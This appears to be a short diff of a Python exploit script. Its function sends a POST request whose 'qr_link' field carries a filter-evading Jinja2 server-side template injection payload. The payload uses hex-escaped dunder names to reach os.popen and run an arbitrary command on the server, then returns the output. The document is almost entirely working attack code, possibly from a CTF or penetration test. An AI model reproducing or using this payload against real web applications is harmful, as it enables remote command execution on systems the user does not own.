@@ -91,7 +91,7 @@ def sttiPost(cookieRC, headers):
         data = {
             'invoice_id': '',
             'form_type': 'scannable_invoice',
-            'qr_link': '{{request|attr(\'application\')|attr(\'\\x5f\\x5fglobals\\x5f\\x5f\')|attr(\'\\x5f\\x5fgetitem\\x5f\\x5f\')(\'\\x5f\\x5fbuiltins\\x5f\\x5f\')|attr(\'\\x5f\\x5fgetitem\\x5f\\x5f\')(\'\\x5f\\x5fimport\\x5f\\x5f\')(\'os\')|attr(\'popen\')(\'id\')|attr(\'read\')()}}'.replace('id', command)
+            'qr_link': '{{request\\|attr(\'application\')|attr(\'\\x5f\\x5fglobals\\x5f\\x5f\')|attr(\'\\x5f\\x5fgetitem\\x5f\\x5f\')(\'\\x5f\\x5fbuiltins\\x5f\\x5f\')|attr(\'\\x5f\\x5fgetitem\\x5f\\x5f\')(\'\\x5f\\x5fimport\\x5f\\x5f\')(\'os\')|attr(\'popen\')(\'id\')|attr(\'read\')()}}'.replace('id', command)
         }
         response = requests.post(url, headers=headers, cookies=cookies, data=data)
         response_text = response.text
